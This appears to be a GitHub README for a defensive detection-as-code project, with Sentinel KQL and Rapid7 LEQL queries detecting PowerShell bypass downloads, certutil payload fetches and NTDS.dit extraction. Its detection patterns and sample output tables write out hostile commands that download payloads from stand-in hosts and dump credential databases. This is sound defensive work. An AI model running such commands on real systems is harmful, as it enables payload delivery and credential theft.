[![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)

# Enterprise Detection-as-Code & Log Correlation Suite

## Repository Structure
```
/sentinel-kql
  suspicious-powershell-execution.kql
  watchlist-tuning.kql
  hunting-conditional-access-anomaly.kql
/rapid7-leql
  certutil-network-connections.leql
  ntds-extraction.leql
/watchlists
  Approved-Vulnerability-Scanners.csv
  Authorized-Admin-Scripts.csv
/mitre-navigator
  detection-coverage.json
LICENSE
README.md
```

## 1. Executive Summary & Objective
* **Problem Statement:** Interface-driven rule creation inside individual SIEM platforms causes configuration drift, weak change tracking, high false-positive rates, and inconsistent coverage against modern adversary techniques.
* **Solution Overview:** This project applies Detection-as-Code (DaC) principles to a set of detection and hunting queries: version-controlled logic, structured change tracking, and reproducible deployment through platform-native SIEM APIs. Queries target Microsoft Sentinel and Rapid7 InsightIDR.
* **Core Capabilities:**
  * High-fidelity alerting using Kusto Query Language (KQL) and Log Entry Query Language (LEQL).
  * False-positive suppression using dynamic watchlists and lookup tables.
  * Detection coverage mapped to MITRE ATT&CK techniques.
  * Threat hunting queries that surface low-and-slow activity below standard alerting thresholds.

## 2. Architecture & Environment Topology
The queries were developed and validated against the shared lab environment (VirtualBox, `10.10.0.0/24`) used across the related SIEM, SOAR, IDS, and vulnerability management projects. Telemetry originates from the Windows endpoint `WKSTN-01` and domain controller `SRV-DC01`.

* **SIEM (Cloud Platform):** Microsoft Sentinel — Log Analytics Workspace using Entra ID identity data, Microsoft 365 Defender components, and Azure Activity logging.
* **SIEM (Enterprise Platform):** Rapid7 InsightIDR — Insight Agents, collection engines, and cloud-to-cloud connectors.
* **Telemetry Sources:** Endpoint process events (`DeviceProcessEvents`), Active Directory operations, network proxy traffic, and cloud authentication logs (`SigninLogs`).
* **Deployment Model:** Query logic maintained under version control and pushed to platform-native APIs, enabling change history and peer review.

## 3. Engineering Thought Process & Methodology
* **Design Considerations:** Managing detections as code addresses the core limits of GUI rule creation: no change history, inconsistent syntax, and rules that don't reproduce cleanly across distinct environments.
* **Technical Challenges & Resolution:**
  * **Challenge:** Variable administrative behavior across environments causes false positives when rigid out-of-the-box rules are applied uniformly.
  * **Resolution:** Localized lookup containers (Sentinel Watchlists) abstract environment-specific variance out of the core query. The base detection runs globally and calls the watchlists at query time to exclude trusted entities, rather than maintaining separate rule copies.

## 4. Cyber Kill Chain & Threat Lifecycle Mapping
* **Weaponization & Delivery:** Dual-use tool activity and living-off-the-land execution via remote code download.
* **Installation:** Downloaders, persistence binaries, and processes executing from unprivileged temp directories.
* **Actions on Objectives:** Data access anomalies, volume shadow copy manipulation, and directory database extraction against identity infrastructure.

## 5. MITRE ATT&CK Matrix Alignment

| Tactic | Technique ID | Technique Name | Detection Mechanism |
| :--- | :--- | :--- | :--- |
| **Execution** | T1059.001 | PowerShell | Execution policy bypass flags combined with network download methods in `DeviceProcessEvents`. |
| **Command and Control** | T1105 | Ingress Tool Transfer | Standard Windows utility switches (`certutil.exe -urlcache`) used to drop external payloads. |
| **Credential Access** | T1003.003 | NTDS | Volume shadow copy creation or native utilities (`ntdsutil.exe`) interacting with the identity database. |

A pre-built ATT&CK Navigator layer for this coverage is available at `mitre-navigator/detection-coverage.json` — import it directly at [mitre-attack.github.io/attack-navigator](https://mitre-attack.github.io/attack-navigator/).

## 6. Telemetry & Suppression Logic
* **Telemetry Correlated:** Cloud sign-in activity, administrative process monitoring, and host audit logs.
* **Suppression Datasets:** Reference watchlists (`watchlists/Approved-Vulnerability-Scanners.csv`, `watchlists/Authorized-Admin-Scripts.csv`) containing known asset identifiers and approved script paths, checked against telemetry at query time.

## 7. Implementation & Query Logic
Each query below is also available as a standalone file in `/sentinel-kql` or `/rapid7-leql`.

### Use Case 1: Suspicious PowerShell Payload Execution (KQL)
`sentinel-kql/suspicious-powershell-execution.kql`
```kusto
// Detect PowerShell execution policy bypass followed by a remote download
let BypassedExecution = DeviceProcessEvents
| where ProcessCommandLine has_any ("-ExecutionPolicy bypass", "-ep bypass")
| where ProcessCommandLine has_any ("Invoke-WebRequest", "iwr", "Net.WebClient", "DownloadFile");
BypassedExecution
| extend AccountName = iff(isnotempty(InitiatingProcessAccountName), InitiatingProcessAccountName, AccountName)
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
| sort by TimeGenerated desc
```

### Use Case 2: False-Positive Tuning via Watchlists (KQL)
`sentinel-kql/watchlist-tuning.kql` — depends on the two watchlist CSVs in `/watchlists`.
```kusto
let ApprovedScanners = _GetWatchlist('Approved-Vulnerability-Scanners') | project IPAddress;
let ApprovedScripts = _GetWatchlist('Authorized-Admin-Scripts') | project ScriptName;
DeviceProcessEvents
| where ProcessCommandLine has_any ("-ExecutionPolicy bypass", "-ep bypass")
| where ProcessCommandLine has_any ("Invoke-WebRequest", "iwr")
| where not(RemoteIP in (ApprovedScanners))
| where not(ProcessCommandLine has_any (ApprovedScripts))
```

### Use Case 3: Certutil Network Connections (LEQL)
`rapid7-leql/certutil-network-connections.leql`
```text
where(process.name="certutil.exe" AND process.cmd_line=/"-urlcache"/ AND process.cmd_line=/"-split"/)
```

### Use Case 4: NTDS.dit Extraction (LEQL)
`rapid7-leql/ntds-extraction.leql`
```text
where(process.name="ntdsutil.exe" AND process.cmd_line=/"ac i ntds"/ AND process.cmd_line=/"ifm"/) OR where(process.cmd_line=/"vssadmin create shadow"/)
```

### Hunting Query: Anomalous Conditional Access Failures (KQL)
`sentinel-kql/hunting-conditional-access-anomaly.kql`
```kusto
SigninLogs
| where ResultType == "53003" // Conditional Access Policy Block
| summarize FailedCount = count() by UserPrincipalName, IPAddress, Location, AppDisplayName
| where FailedCount > 5
| sort by FailedCount desc
```

## 8. Query Output Examples
The examples below use lab-generated identifiers and reserved documentation IP ranges (RFC 5737) to show the shape of query output.

**PowerShell Payload Detection (Sentinel):**
| TimeGenerated | DeviceName | AccountName | FileName | ProcessCommandLine |
| :--- | :--- | :--- | :--- | :--- |
| 2025-03-14T09:12:03Z | WKSTN-01 | labuser | powershell.exe | `powershell.exe -ExecutionPolicy bypass -Command "Invoke-WebRequest -Uri hxxp://203.0.113.10/update.ps1 -OutFile C:\Users\Public\update.ps1"` |

**Ingress Tool Transfer (InsightIDR):**
| Timestamp | Asset | User | process.name | process.cmd_line |
| :--- | :--- | :--- | :--- | :--- |
| 2025-03-13T22:14:03Z | WKSTN-01 | labuser | certutil.exe | `certutil.exe -urlcache -split -f hxxp://198.51.100.20/payload.dll C:\Windows\Temp\payload.dll` |

**Conditional Access Anomaly (Sentinel):**
| UserPrincipalName | IPAddress | AppDisplayName | FailedCount |
| :--- | :--- | :--- | :--- |
| labuser@example.com | 192.0.2.44 | Microsoft Office 365 | 23 |

### Suppression Result
Applying the watchlist exclusion pattern in Use Case 2 against the lab baseline reduced recurring false positives from known-trusted sources (approved scanners, authorized admin scripts) without narrowing the underlying detection logic. The magnitude of reduction depends on the environment's baseline noise and watchlist maintenance.

## 9. Hardening & Future Enhancements
* **Maintenance Approach:** New detection logic is validated against a historical lookback window before promotion, with peer review on any change to suppression logic.
* **Future Roadmap:**
  * [ ] Convert queries to Sigma format for translation into Splunk, CrowdStrike, and Elastic syntax.
  * [ ] Add automated testing with threat emulation tooling (Atomic Red Team) to validate detection logic in a staging environment.

## License
MIT — see [LICENSE](./LICENSE).

<br><br><br>
[![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)
